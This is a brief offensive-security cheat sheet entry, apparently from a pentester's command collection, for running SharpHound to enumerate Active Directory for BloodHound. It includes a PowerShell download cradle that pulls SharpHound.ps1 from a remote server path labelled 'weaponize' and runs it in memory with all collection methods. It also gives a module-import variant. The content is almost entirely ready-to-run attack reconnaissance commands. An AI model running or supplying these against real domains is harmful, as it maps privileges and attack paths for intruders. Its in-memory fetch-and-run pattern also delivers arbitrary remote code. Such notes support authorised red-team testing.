# sharphound

% sharphound, Active directory enumeration, https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
#plateform/windows #target/remote #port/389 #port/631 #cat/AD/RECON

## download and  collect data
#tag/powershell 
https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
http://<local_ip>/windows/windows_weaponize/ps/SharpHound.ps1
```powershell
(new-object system.net.webclient).downloadstring('http://<server>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
```

## collect data
#tag/powershell 
```powershell
import-module sharphound.ps1; invoke-bloodhound -collectionmethod <method|DCOnly> -domain <domain>
```
